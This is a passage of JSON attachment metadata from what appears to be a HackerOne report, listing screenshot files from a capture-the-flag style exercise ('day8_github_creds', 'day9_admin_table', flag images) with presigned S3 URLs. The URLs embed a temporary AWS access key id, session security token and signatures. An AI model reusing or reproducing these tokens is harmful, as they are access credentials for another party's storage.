w9e9PqozA16XzrwGIunimlg58HKZfOM0xp%2FESLFXRHAssX6DaYqQQyV5%2F0triAQeOx328GOBUjfGTiAl1aoS1J0%2FqN%2BmywXW%2FqqkEfAQ2n2f18dX2dkbwMnyQ4F47zR6jJw3CdBkeCPRDbbhcu8YGu2%2F%2BzzM9B4uguhR76M3KYB3dr919eRp%2F%2BcOfUxc8TC3gXMmp1jh0ywwC27sBrzUgZdh%2B2g4artPxRaRZPHbQvC%2F1OZ0MxZYsQmEItbUc65WqfO6PSdLbymEFDMyN5ona14j%2BaQHfp1MWNaO02I2WPYO5mZIsPuHjCO5MYUldcsrZMP7pydKVo87gkO2fPB2orxw1RGazxVwGy5R2PDIV7HsKH4KSOqhGLTTYcSjZvxzmTWIy013yrXhU3CEdFUoB7QifSN1bUli2cMIaUe7sr75onhlaNnQxqLv%2By7jqQ9RiOHvcMM4XIMInwkIsGOqYBzgDHFUI%2FtkToYUBHsGsXyI9vGkS81IUV4PSjgSfvCFIGR%2BPjro3EYi30Oc%2FQZijhik3H1oI82Vno5zo%2BVnueR7%2BkGCloKvMkJAe%2F77e%2BPPRDClquvRG9ERm7ELsd6WvljYOJTmuP4pWPW%2B2d%2BQu26lThNein0I5abJKiu%2FYvnXDmBeYAgLMwbyg9Lq3qT5qMKsr3i1aOgHcGHtYldnzNcLqwaNJYhw%3D%3D\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Signature=306a06f5b6e2bed0cce89ccd7a7d98462ee7738296e12a6c2a300b48d9b9336d"},{"id":1139693,"filename":"day8_db_access.png","type":"image/png","url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/0rhqdvayy39737cmai48g9en3vv0?response-content-disposition=attachment%3B%20filename%3D%22day8_db_access.png%22%3B%20filename%2A%3DUTF-8%27%27day8_db_access.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQRJF6VFL6%2F20211011%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20211011T132105Z\u0026X-Amz-Expires=3600\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHUaCXVzLXdlc3QtMiJGMEQCID1So1KYRjOmBFJqLsqO1j9SSUCF9kJ%2FHqahOyDLmrnJAiAr2q5Z8bAgCyaCmyDSz7xwtmUTDOoz04myJOluBHRCeyqDBAju%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F8BEAIaDDAxMzYxOTI3NDg0OSIMvFUMWX6P00RsVarQKtcDflFFNScU3coA1YbnKy4lPXtwGDNsJcqhfcCTaePuAuK6nWvl5xRbjzjOBPvBHaTAnb2Iw%2B6Jdj2uyjmRMn%2F5%2F5AzD5di2wWOcC0am9iLaFmORG4VIVXTc8aAiiwqjNAu7dH2hTUNL9bwPzYUBq3%2FjwvNZUM%2FmpdXfugOwAP%2FP3w9e9PqozA16XzrwGIunimlg58HKZfOM0xp%2FESLFXRHAssX6DaYqQQyV5%2F0triAQeOx328GOBUjfGTiAl1aoS1J0%2FqN%2BmywXW%2FqqkEfAQ2n2f18dX2dkbwMnyQ4F47zR6jJw3CdBkeCPRDbbhcu8YGu2%2F%2BzzM9B4uguhR76M3KYB3dr919eRp%2F%2BcOfUxc8TC3gXMmp1jh0ywwC27sBrzUgZdh%2B2g4artPxRaRZPHbQvC%2F1OZ0MxZYsQmEItbUc65WqfO6PSdLbymEFDMyN5ona14j%2BaQHfp1MWNaO02I2WPYO5mZIsPuHjCO5MYUldcsrZMP7pydKVo87gkO2fPB2orxw1RGazxVwGy5R2PDIV7HsKH4KSOqhGLTTYcSjZvxzmTWIy013yrXhU3CEdFUoB7QifSN1bUli2cMIaUe7sr75onhlaNnQxqLv%2By7jqQ9RiOHvcMM4XIMInwkIsGOqYBzgDHFUI%2FtkToYUBHsGsXyI9vGkS81IUV4PSjgSfvCFIGR%2BPjro3EYi30Oc%2FQZijhik3H1oI82Vno5zo%2BVnueR7%2BkGCloKvMkJAe%2F77e%2BPPRDClquvRG9ERm7ELsd6WvljYOJTmuP4pWPW%2B2d%2BQu26lThNein0I5abJKiu%2FYvnXDmBeYAgLMwbyg9Lq3qT5qMKsr3i1aOgHcGHtYldnzNcLqwaNJYhw%3D%3D\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Signature=9910cd3fde015187f79df18dd9da241d373ea449f47ae0ce16586bd9709a162f"},{"id":1139694,"filename":"day8_flag.png","type":"image/png","url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/e4pbbsispibh8bnxa6akvwq3gg3z?response-content-disposition=attachment%3B%20filename%3D%22day8_flag.png%22%3B%20filename%2A%3DUTF-8%27%27day8_flag.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQRJF6VFL6%2F20211011%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20211011T132105Z\u0026X-Amz-Expires=3600\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHUaCXVzLXdlc3QtMiJGMEQCID1So1KYRjOmBFJqLsqO1j9SSUCF9kJ%2FHqahOyDLmrnJAiAr2q5Z8bAgCyaCmyDSz7xwtmUTDOoz04myJOluBHRCeyqDBAju%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F8BEAIaDDAxMzYxOTI3NDg0OSIMvFUMWX6P00RsVarQKtcDflFFNScU3coA1YbnKy4lPXtwGDNsJcqhfcCTaePuAuK6nWvl5xRbjzjOBPvBHaTAnb2Iw%2B6Jdj2uyjmRMn%2F5%2F5AzD5di2wWOcC0am9iLaFmORG4VIVXTc8aAiiwqjNAu7dH2hTUNL9bwPzYUBq3%2FjwvNZUM%2FmpdXfugOwAP%2FP3w9e9PqozA16XzrwGIunimlg58HKZfOM0xp%2FESLFXRHAssX6DaYqQQyV5%2F0triAQeOx328GOBUjfGTiAl1aoS1J0%2FqN%2BmywXW%2FqqkEfAQ2n2f18dX2dkbwMnyQ4F47zR6jJw3CdBkeCPRDbbhcu8YGu2%2F%2BzzM9B4uguhR76M3KYB3dr919eRp%2F%2BcOfUxc8TC3gXMmp1jh0ywwC27sBrzUgZdh%2B2g4artPxRaRZPHbQvC%2F1OZ0MxZYsQmEItbUc65WqfO6PSdLbymEFDMyN5ona14j%2BaQHfp1MWNaO02I2WPYO5mZIsPuHjCO5MYUldcsrZMP7pydKVo87gkO2fPB2orxw1RGazxVwGy5R2PDIV7HsKH4KSOqhGLTTYcSjZvxzmTWIy013yrXhU3CEdFUoB7QifSN1bUli2cMIaUe7sr75onhlaNnQxqLv%2By7jqQ9RiOHvcMM4XIMInwkIsGOqYBzgDHFUI%2FtkToYUBHsGsXyI9vGkS81IUV4PSjgSfvCFIGR%2BPjro3EYi30Oc%2FQZijhik3H1oI82Vno5zo%2BVnueR7%2BkGCloKvMkJAe%2F77e%2BPPRDClquvRG9ERm7ELsd6WvljYOJTmuP4pWPW%2B2d%2BQu26lThNein0I5abJKiu%2FYvnXDmBeYAgLMwbyg9Lq3qT5qMKsr3i1aOgHcGHtYldnzNcLqwaNJYhw%3D%3D\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Signature=f3f6cdc3ef493125be88d875b360ef7af93c24679f2311e8b5db0b6ce3077c90"},{"id":1139695,"filename":"day8_github_creds.png","type":"image/png","url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/1te87hcbd7qzk7ar6a7nbo08t8eo?response-content-disposition=attachment%3B%20filename%3D%22day8_github_creds.png%22%3B%20filename%2A%3DUTF-8%27%27day8_github_creds.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQRJF6VFL6%2F20211011%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20211011T132105Z\u0026X-Amz-Expires=3600\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHUaCXVzLXdlc3QtMiJGMEQCID1So1KYRjOmBFJqLsqO1j9SSUCF9kJ%2FHqahOyDLmrnJAiAr2q5Z8bAgCyaCmyDSz7xwtmUTDOoz04myJOluBHRCeyqDBAju%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F8BEAIaDDAxMzYxOTI3NDg0OSIMvFUMWX6P00RsVarQKtcDflFFNScU3coA1YbnKy4lPXtwGDNsJcqhfcCTaePuAuK6nWvl5xRbjzjOBPvBHaTAnb2Iw%2B6Jdj2uyjmRMn%2F5%2F5AzD5di2wWOcC0am9iLaFmORG4VIVXTc8aAiiwqjNAu7dH2hTUNL9bwPzYUBq3%2FjwvNZUM%2FmpdXfugOwAP%2FP3w9e9PqozA16XzrwGIunimlg58HKZfOM0xp%2FESLFXRHAssX6DaYqQQyV5%2F0triAQeOx328GOBUjfGTiAl1aoS1J0%2FqN%2BmywXW%2FqqkEfAQ2n2f18dX2dkbwMnyQ4F47zR6jJw3CdBkeCPRDbbhcu8YGu2%2F%2BzzM9B4uguhR76M3KYB3dr919eRp%2F%2BcOfUxc8TC3gXMmp1jh0ywwC27sBrzUgZdh%2B2g4artPxRaRZPHbQvC%2F1OZ0MxZYsQmEItbUc65WqfO6PSdLbymEFDMyN5ona14j%2BaQHfp1MWNaO02I2WPYO5mZIsPuHjCO5MYUldcsrZMP7pydKVo87gkO2fPB2orxw1RGazxVwGy5R2PDIV7HsKH4KSOqhGLTTYcSjZvxzmTWIy013yrXhU3CEdFUoB7QifSN1bUli2cMIaUe7sr75onhlaNnQxqLv%2By7jqQ9RiOHvcMM4XIMInwkIsGOqYBzgDHFUI%2FtkToYUBHsGsXyI9vGkS81IUV4PSjgSfvCFIGR%2BPjro3EYi30Oc%2FQZijhik3H1oI82Vno5zo%2BVnueR7%2BkGCloKvMkJAe%2F77e%2BPPRDClquvRG9ERm7ELsd6WvljYOJTmuP4pWPW%2B2d%2BQu26lThNein0I5abJKiu%2FYvnXDmBeYAgLMwbyg9Lq3qT5qMKsr3i1aOgHcGHtYldnzNcLqwaNJYhw%3D%3D\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Signature=b1ebddd5b5b2bac6e559a5b9c7b9d641550ce1f704a46371b1b7b49c42c8c1b4"},{"id":1139696,"filename":"day8_github.png","type":"image/png","url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/r1eno2mpgbcgxt4fktslyd5yrfjj?response-content-disposition=attachment%3B%20filename%3D%22day8_github.png%22%3B%20filename%2A%3DUTF-8%27%27day8_github.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQRJF6VFL6%2F20211011%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20211011T132105Z\u0026X-Amz-Expires=3600\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHUaCXVzLXdlc3QtMiJGMEQCID1So1KYRjOmBFJqLsqO1j9SSUCF9kJ%2FHqahOyDLmrnJAiAr2q5Z8bAgCyaCmyDSz7xwtmUTDOoz04myJOluBHRCeyqDBAju%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F8BEAIaDDAxMzYxOTI3NDg0OSIMvFUMWX6P00RsVarQKtcDflFFNScU3coA1YbnKy4lPXtwGDNsJcqhfcCTaePuAuK6nWvl5xRbjzjOBPvBHaTAnb2Iw%2B6Jdj2uyjmRMn%2F5%2F5AzD5di2wWOcC0am9iLaFmORG4VIVXTc8aAiiwqjNAu7dH2hTUNL9bwPzYUBq3%2FjwvNZUM%2FmpdXfugOwAP%2FP3w9e9PqozA16XzrwGIunimlg58HKZfOM0xp%2FESLFXRHAssX6DaYqQQyV5%2F0triAQeOx328GOBUjfGTiAl1aoS1J0%2FqN%2BmywXW%2FqqkEfAQ2n2f18dX2dkbwMnyQ4F47zR6jJw3CdBkeCPRDbbhcu8YGu2%2F%2BzzM9B4uguhR76M3KYB3dr919eRp%2F%2BcOfUxc8TC3gXMmp1jh0ywwC27sBrzUgZdh%2B2g4artPxRaRZPHbQvC%2F1OZ0MxZYsQmEItbUc65WqfO6PSdLbymEFDMyN5ona14j%2BaQHfp1MWNaO02I2WPYO5mZIsPuHjCO5MYUldcsrZMP7pydKVo87gkO2fPB2orxw1RGazxVwGy5R2PDIV7HsKH4KSOqhGLTTYcSjZvxzmTWIy013yrXhU3CEdFUoB7QifSN1bUli2cMIaUe7sr75onhlaNnQxqLv%2By7jqQ9RiOHvcMM4XIMInwkIsGOqYBzgDHFUI%2FtkToYUBHsGsXyI9vGkS81IUV4PSjgSfvCFIGR%2BPjro3EYi30Oc%2FQZijhik3H1oI82Vno5zo%2BVnueR7%2BkGCloKvMkJAe%2F77e%2BPPRDClquvRG9ERm7ELsd6WvljYOJTmuP4pWPW%2B2d%2BQu26lThNein0I5abJKiu%2FYvnXDmBeYAgLMwbyg9Lq3qT5qMKsr3i1aOgHcGHtYldnzNcLqwaNJYhw%3D%3D\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Signature=d5726decfa4e1c4bd3142b7be427cadfdf729033bed9be7606b546f028c0907f"},{"id":1139697,"filename":"day9_admin_table.png","type":"image/png","url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/xp8k7trvc2hmg5agu2oeujwma5k5?response-content-disposition=attachment%3B%20filename%3D%22day9_admin_table.png%22%3B%20filename%2A%3DUTF-8%27%27day9_admin_table.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQRJF6VFL6%2F20211011%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20211011T132105Z\u0026X-Amz-Expires=3600\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHUaCXVzLXdlc3QtMiJGMEQCID1So1KYRjOmBFJqLsqO1j9SSUCF9kJ%2FHqahOyDLmrnJAiAr2q5Z8bAgCyaCmyDSz7xwtmUTDOoz04myJOluBHRCeyqDBAju%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F8BEAIaDDAxMzYxOTI3NDg0OSIMvFUMWX6P00RsVarQKtcDflFFNScU3coA1YbnKy4lPXtwGDNsJcqhfcCTaePuAuK6nWvl5xRbjzjOBPvBHaTAnb2Iw%2B6Jdj2uyjmRMn%2F5%2F5AzD5di2wWOcC0am9iLaFmORG4VIVXTc8aAiiwqjNAu7dH2hTUNL9bwPzYUBq3%2FjwvNZUM%2FmpdXfugOwAP%2FP3w9e9PqozA16XzrwGIunimlg58HKZfOM0xp%2FESLFXRHAssX6DaYqQQyV5%2F0triAQeOx328GOBUjfGTiAl1aoS1J0%2FqN%2BmywXW%2FqqkEfAQ2n2f18dX2dkbwMnyQ4F47zR6jJw3CdBkeCPRDbbhcu8YGu2%2F%2BzzM9B4uguhR76M3KYB3dr919eRp%2F%2BcOfUxc8TC3gXMmp1jh0ywwC27sBrzUgZdh%2B2g4artPxRaRZPHbQvC%2F1OZ0MxZYsQmEItbUc65WqfO6PSdLbymEFDMyN5ona14j%2BaQHfp1MWNaO02I2WPYO5mZIsPuHjCO5MYUldcsrZMP7pydKVo87gkO2fPB2orxw1RGazxVwGy5R2PDIV7HsKH4KSOqhGLTTYcSjZvxzmTWIy013yrXhU3CEdFUoB7QifSN1bUli2cMIaUe7sr75onhlaNnQxqLv%2By7jqQ9RiOHvcMM4XIMInwkIsGOqYBzgDHFUI%2FtkToYUBHsGsXyI9vGkS81IUV4PSjgSfvCFIGR%2BPjro3EYi30Oc%2FQZijhik3H1oI82Vno5zo%2BVnueR7%2BkGCloKvMkJAe%2F77e%2BPPRDClquvRG9ERm7ELsd6WvljYOJTmuP4pWPW%2B2d%2BQu26lThNein0I5abJKiu%2FYvnXDmBeYAgLMwbyg9Lq3qT5qMKsr3i1aOgHcGHtYldnzNcLqwaNJYhw%3D%3D\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Signature=f7bb5465ef90f3a1f14ef03ee3dd373b0f1ae62ca366d99f15463f727cb02522"},{"id":1139698,"filename":"day8_totallylegitphpmyadmin.png","type":"image/png","url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/sqry0ix6c2instr12rd7g0e8irlj?response-content-disposition=attachment%3B%20filename%3D%22day8_totallylegitphpmyadmin.png%22%3B%20filename%2A%3DUTF-8%27%27day8_totallylegitphpmyadmin.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQRJF6VFL6%2F20211011%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20211011T132105Z\u0026X-Amz-Expires=3600\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHUaCXVzLXdlc3QtMiJGMEQCID1So1KYRjOmBFJqLsqO1j9SSUCF9kJ%2FHqahOyDLmrnJAiAr2q5Z8bAgCyaCmyDSz7xwtmUTDOoz04myJOluBHRCeyqDBAju%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F8BEAIaDDAxMzYxOTI3NDg0OSIMvFUMWX6P00RsVarQKtcDflFFNScU3coA1YbnKy4lPXtwGDNsJcqhfcCTaePuAuK6nWvl5xRbjzjOBPvBHaTAnb2Iw%2B6Jdj2uyjmRMn%2F5%2F5AzD5di2wWOcC0am9iLaFmORG4VIVXTc8aAiiwqjNAu7dH2hTUNL9bwPzYUBq3%2FjwvNZUM%2FmpdXfugOwAP%2FP3w9e9PqozA16XzrwGIunimlg58HKZfOM0xp%2FESLFXRHAssX6DaYqQQyV5%2F0triAQeOx328GOBUjfGTiAl1aoS1J0%2FqN%2BmywXW%2FqqkEfAQ2n2f18dX2dkbwMnyQ4F47zR6jJw3CdBkeCPRDbbhcu8YGu2%2F%2BzzM9B4uguhR76M3KYB3dr919eRp%2F%2BcOfUxc8TC3gXMmp1jh0ywwC27sBrzUgZdh%2B2g4artPxRaRZPHbQvC%2F1OZ0MxZYsQmEItbUc65WqfO6PSdLbymEFDMyN5ona14j%2BaQHfp1MWNaO02I2WPYO5mZIsPuHjCO5MYUldcsrZMP7pydKVo87gkO2fPB2orxw1RGazxVwGy5R2PDIV7HsKH4KSOqhGLTTYcSjZvxzmTWIy013yrXhU3CEdFUoB7QifSN1bUli2cMIaUe7sr75onhlaNnQxqLv%2By7jqQ9RiOHvcMM4XIMInwkIsGOqYBzgDHFUI%2FtkToYUBHsGsXyI9vGkS81IUV4PSjgSfvCFIGR%2BPjro3EYi30Oc%2FQZijhik3H1oI82Vno5zo%2BVnueR7%2BkGCloKvMkJAe%2F77e%2BPPRDClquvRG9ERm7ELsd6WvljYOJTmuP4pWPW%2B2d%2BQu26lThNein0I5abJKiu%2FYvnXDmBeYAgLMwbyg9Lq3qT5qMKsr3i1aOgHcGHtYldnzNcLqwaNJYhw%3D%3D\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Signature=dce75ce198853520708ac6c7e44adac70f6c656b126128e62379ec49a59feb4b"},{"id":1139699,"filename":"day9_admin_user.png","type":"image/png","url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/epmhc9mtpuvcek0600p706e9qypl?response-content-disposition=attachment%3B%20filename%3D%22day9_admin_user.png%22%3B%20filename%2A%3DUTF-8%27%27day9_admin_user.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQRJF6VFL6%2F20211011%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20211011T132105Z\u0026X-Amz-Expires=3600\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHUaCXVzLXdlc3QtMiJGMEQCID1So1KYRjOmBFJqLsqO1j9SSUCF9kJ%2FHqahOyDLmrnJAiAr2q5Z8bAgCyaCmyDSz7xwtmUTDOoz04myJOluBHRCeyqDBAju%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F8BEAIaDDAxMzYxOTI3NDg0OSIMvFUMWX6P00RsVarQKtcDflFFNScU3coA1YbnKy4lPXtwGDNsJcqhfcCTaePuAuK6nWvl5xRbjzjOBPvBHaTAnb2Iw%2B6Jdj2uyjmRMn%2F5%2F5AzD5di2wWOcC0am9iLaFmORG4VIVXTc8aAiiwqjNAu7dH2hTUNL9bwPzYUBq3%2FjwvNZUM%2FmpdXfugOwAP%2FP3w9e9PqozA16XzrwGIunimlg58HKZfOM0xp%2FESLFXRHAssX6DaYqQQyV5%2F0triAQeOx328GOBUjfGTiAl1aoS1J0%2FqN%2BmywXW%2FqqkEfAQ2n2f18dX2dkbwMnyQ4F47zR6jJw3CdBkeCPRDbbhcu8YGu2%2F%2BzzM9B4uguhR76M3KYB3dr919eRp%2F%2BcOfUxc8TC3gXMmp1jh0ywwC27sBrzUgZdh%2B2g4artPxRaRZPHbQvC%2F1OZ0MxZYsQmEItbUc65WqfO6PSdLbymEFDMyN5ona14j%2BaQHfp1MWNaO02I2WPYO5mZIsPuHjCO5MYUldcsrZMP7pydKVo87gkO2fPB2orxw1RGazxVwGy5R2PDIV7HsKH4KSOqhGLTTYcSjZvxzmTWIy013yrXhU3CEdFUoB7QifSN1bUli2cMIaUe7sr75onhlaNnQxqLv%2By7jqQ9RiOHvcMM4XIMInwkIsGOqYBzgDHFUI%2FtkToYUBHsGsXyI9vGkS81IUV4PSjgSfvCFIGR%2BPjro3EYi30Oc%2FQZijhik3H1oI82Vno5zo%2BVnueR7%2BkGCloKvMkJAe%2F77e%2BPPRDClquvRG9ERm7ELsd6WvljYOJTmuP4pWPW%2B2d%2BQu26lThNein0I5abJKiu%2FYvnXDmBeYAgLMwbyg9Lq3qT5qMKsr3i1aOgHcGHtYldnzNcLqwaNJYhw%3D%3D\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Signature=506a4b090ed49c163b05c212b02f4094f8e13b2e7342e300d33c0c28a788b422"},{"id":1139700,"filename":"day9_flag.png","type":"image/png","url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/r7nyl01f22ozj1dzg4ifgglud1as?response-content-disposition=attachment%3B%20filename%3D%22day9_flag.png%22%3B%20filename%2A%3DUTF-8%27%27day9_flag.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQRJF6VFL6%2F20211011%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20211011T132105Z\u0026X-Amz-Expires=3600\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHUaCXVzLXdlc3QtMiJGMEQCID1So1KYRjOmBFJqLsqO1j9SSUCF9kJ%2FHqahOyDLmrnJAiAr2q5Z8bAgCyaCmyDSz7xwtmUTDOoz04myJOluBHRCeyqDBAju%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F8BEAIaDDAxMzYxOTI3NDg0OSIMvFUMWX6P00RsVarQKtcDflFFNScU3coA1YbnKy4lPXtwGDNsJcqhfcCTaePuAuK6nWvl5xRbjzjOBPvBHaTAnb2Iw%2B6Jdj2uyjmRMn%2F5%2F5AzD5di2wWOcC0am9iLaFmORG4VIVXTc8aAiiwqjNAu7dH2hTUNL9bwPzYUBq3%2FjwvNZUM%2FmpdXfugOwAP%2FP3w9e9PqozA16XzrwGIunimlg58HKZfOM0xp%2FESLFXRHAssX6DaYqQQyV5%2F0triAQeOx328GOBUjfGTiAl1aoS1J0%2FqN%2BmywXW%2FqqkEfAQ2n2f18dX2dkbwMnyQ4F47zR6jJw3CdBkeCPRDbbhcu8YGu2%2F%2BzzM9B4uguhR76M3KYB3dr919eRp%2F%2BcOfUxc8TC3gXMmp1jh0ywwC27sBrzUgZdh%2B2g4artPxRaRZPHbQvC%2F1OZ0MxZYsQmEItbUc65WqfO6PSdLbymEFDMyN5ona14j%2BaQHfp1MWNaO02I2WPYO5mZIsPuHjCO5MYUldcsrZMP7pydKVo87gkO2fPB2orxw1RGazxVwGy5R2PDIV7HsKH4KSOqhGLTTYcSjZvxzmTWIy013yrXhU3CEdFUoB7QifSN1bUli2cMIaUe7sr75onhlaNnQxqLv%2By7jqQ9RiOHvcMM4XIMInwkIsGOqYBzgDHFUI%2FtkToYUBHsGsXyI9vGkS81IUV4PSjgSfvCFIGR%2BPjro3EYi30Oc%2FQZijhik3H1oI82Vno5zo%2BVnueR7%2BkGCloKvMkJAe%2F77e%2BPPRDClquvRG9ERm7ELsd6WvljYOJTmuP4pWPW%2B2d%2BQu26lThNein0I5abJKiu%2FYvnXDmBeYAgLMwbyg9Lq3qT5qMKsr3i1aOgHcGHtYldnzNcLqwaNJYhw%3D%3D\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Signature=abe709f21c10ee6c2448f44f91e72e0ce0fb284321411322c7d1524b26b2e7b2"},{"id":1139701,"filename":"day9_number_of_users.png","type":"image/png","url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/12p1kstuasrk967oh5ya6oh2eehc?response-content-disposition=attachment%3B%20filename%3D%22day9_number_of_users.png%22%3B%20filename%2A%3DUTF-8%27%27day9_number_of_users.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQRJF6VFL6%2F20211011%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20211011T132105Z\u0026X-Amz-Expires=3600\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHUaCXVzLXdlc3QtMiJGMEQCID1So1KYRjOmBFJqLsqO1j9SSUCF9kJ%2FHqahOyDLmrnJAiAr2q5Z8bAgCyaCmyDSz7xwtmUTDOoz04myJOluBHRCeyqDBAju%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F8BEAIaDDAxMzYxOTI3NDg0OSIMvFUMWX6P00RsVarQKtcDflFFNScU3coA1YbnKy4lPXtwGDNsJcqhfcCTaePuAuK6nWvl5xRbjzjOBPvBHaTAnb2Iw%2B6Jdj2uyjmRMn%2F5%2F5AzD5di2wWOcC0am9iLaFmORG4VIVXTc8aAiiwqjNAu7dH2hTUNL9bwPzYUBq3%2FjwvNZUM%2FmpdXfugOwAP%2FP3w9e9PqozA16XzrwGIunimlg58HKZfOM0xp%2FESLFXRHAssX6DaYqQQyV5%2F0triAQeOx328GOBUjfGTiAl1aoS1J0%2FqN%2BmywXW%2FqqkEfAQ2n2f18dX2dkbwMnyQ4F47zR6jJw3CdBkeCPRDbbhcu8YGu2%2F%2BzzM9B4uguhR76M3KYB3dr919eRp%2F%2BcOfUxc8TC3gXMmp1jh0ywwC27sBrzUgZdh%2B2g4artPxRaRZPHbQvC%2F1OZ0MxZYsQmEItbUc65WqfO6PSdLbymEFDMyN5ona14j%2BaQHfp1MWNaO02I2WPYO5mZIsPuHjCO5MYUldcsrZMP7pydKVo87gkO2fPB2orxw1RGazxVwGy5R2PDIV7HsKH4KSOqhGLTTYcSjZvxzmTWIy013yrXhU3CEdFUoB7QifSN1bUli2cMIaUe7sr75onhlaNnQxqLv%2By7jqQ9RiOHvcMM4XIMInwkIsGOqYBzgDHFUI%2FtkToYUBHsGsXyI9vGkS81IUV4PSjgSfvCFIGR%2BPjro3EYi30Oc%2FQZijhik3H1oI82Vno5zo%2BVnueR7%2BkGCloKvMkJAe%2F77e%2BPPRDClquvRG9ERm7ELsd6WvljYOJTmuP4pWPW%2B2d%2BQu26lThNein0I5abJKiu%2FYvnXDmBeYAgLMwbyg9Lq3qT5qMKsr3i1aOgHcGHtYldnzNcLqwaNJYhw%3D%3D\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Signature=3639737f6aefcf3644454c18db35a199c9edb1701a80549ce24ac117e22000ba"},{"id":1139702,"filename":"day9_quiz.png","type":"image/png","url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/hyufws39fqz5kx85ul6sqoxi9r5l?response-content-disposition=attachment%3B%20filename%3D%22day9_quiz.png%22%3B%20filename%2A%3DUTF-8%27%27day9_quiz.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQRJF6VFL6%2F20211011%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20211011T132105Z\u0026X-Amz-Expires=3600\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHUaCXVzLXdlc3QtMiJGMEQCID1So1KYRjOmBFJqLsqO1j9SSUCF9kJ%2FHqahOyDLmrnJAiAr2q5Z8bAgCyaCmyDSz7xwtmUTDOoz04myJOluBHRCeyqDBAju%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F8BEAIaDDAxMzYxOTI3NDg0OSIMvFUMWX6P00RsVarQKtcDflFFNScU3coA1YbnKy4lPXtwGDNsJcqhfcCTaePuAuK6nWvl5xRbjzjOBPvBHaTAnb2Iw%2B6Jdj2uyjmRMn%2F5%2F5AzD5di2wWOcC0am9iLaFmORG4VIVXTc8aAiiwqjNAu7dH2hTUNL9bwPzYUBq3%2FjwvNZUM%2FmpdXfugOwAP%2FP3w9e9PqozA16XzrwGIunimlg58HKZfOM0xp%2FESLFXRHAssX6DaYqQQyV5%2F0triAQeOx328GOBUjfGTiAl1aoS1J0%2FqN%2BmywXW%2FqqkEfAQ2n2f18dX2dkbwMnyQ4F47zR6jJw3CdBkeCPRDbbhcu8YGu2%2F%2BzzM9B4uguhR76M3KYB3dr919eRp%2F%2BcOfUxc8TC3gXMmp1jh0ywwC27sBrzUgZdh%2B2g4artPxRaRZPHbQvC%2F1OZ0MxZYsQmEItbUc65WqfO6PSdLbymEFDMyN5ona14j%2BaQHfp1M